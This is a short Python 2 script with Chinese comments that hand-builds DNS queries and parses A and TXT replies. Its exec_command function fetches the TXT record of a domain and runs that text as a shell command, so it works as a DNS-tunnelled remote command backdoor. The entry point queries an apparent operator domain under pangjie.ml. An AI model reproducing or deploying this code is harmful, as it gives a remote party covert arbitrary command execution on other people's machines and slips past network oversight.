# -*- coding:utf-8 -*-

import socket
import struct
import random
import subprocess
import zlib

dns_server = '8.8.8.8'
port = 53
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


# dns请求
def dns_query(query_type, domain):
    # 构造dns协议头
    qtypt = {'A': 0x0001, 'TXT': 0x0010}
    id = random.randint(-32768, 32767)
    flags = 0x0100
    questions = 0x001
    auswerrrs = 0x0000
    authorityrrs = 0x0000
    additionalrrS = 0x0000
    bufheader = struct.pack('!hhhhhh', id, flags, questions, auswerrrs, authorityrrs, additionalrrS)
    # 构造dns协议尾
    searchtype = qtypt[query_type]
    searchclass = 0x0001
    buftail = struct.pack('!hh', searchtype, searchclass)
    # Queries区域
    domaintobyte = ''
    domainsplit = domain.split('.')
    for ds in domainsplit:
        packstr = 'B%ds' % len(ds)
        domaintobyte += struct.pack(packstr, len(ds), ds)
    domaintobyte += '\0'
    # 拼接完整请求
    print domaintobyte
    querydata = bufheader + domaintobyte + buftail
    sock.sendto(querydata, (dns_server, port))
    return sock.recvfrom(1024)[0]


# 解析返回包
def dns_answer(domain):
    data = dns_query('A', domain)
    # 跳过协议头
    bitnumber = 12
    # 应答资源数
    answerrrs = struct.unpack('!h', data[6:8])[0]
    # 请求中域名结束后填充\x00, 在应答中表示域名结束，后面为answer内容
    while data[bitnumber] != '\x00':
        bitnumber += 1
    # 域名结束
    bitnumber += 1
    # 跳过请求中的Type,Class In
    bitnumber += 4
    for i in range(answerrrs):
        # 跳过表示指向请求中域名的c00c指针
        bitnumber += 2
        # 判断返回请求类型
        if data[bitnumber:bitnumber+2] == '\x00\x01':
            # 跳过应答中的Type,Class In，TTL,data length
            bitnumber += 10
            # 获取ip，4个字节
            iptuple = struct.unpack('!BBBB', data[bitnumber:bitnumber+4])
            ipstr = '%d.%d.%d.%d' % iptuple
            print ipstr
        elif data[bitnumber:bitnumber+2] == '\x00\x10':
            # 跳过应答中的Type,Class In，TTL,data length
            bitnumber += 10
            # 获取 TXT Length
            txt_lenght = struct.unpack('!B', data[bitnumber:bitnumber + 1])[0]
            # 跳过TXT length 一个字节
            bitnumber += 1
            unpackstr = '!'
            for i in range(txt_lenght):
                unpackstr += 's'
            txt_tuple = struct.unpack(unpackstr, data[bitnumber:bitnumber + txt_lenght])
            txt_text = ''
            for i in txt_tuple:
                txt_text += i
            return txt_text
        
        
def exec_command(domain):
    command = dns_answer(domain)
    result = subprocess.check_output(command, shell=True)
    print result
            

if __name__ == '__main__':
    dns_query('A', '+.ns1.pangjie.ml')


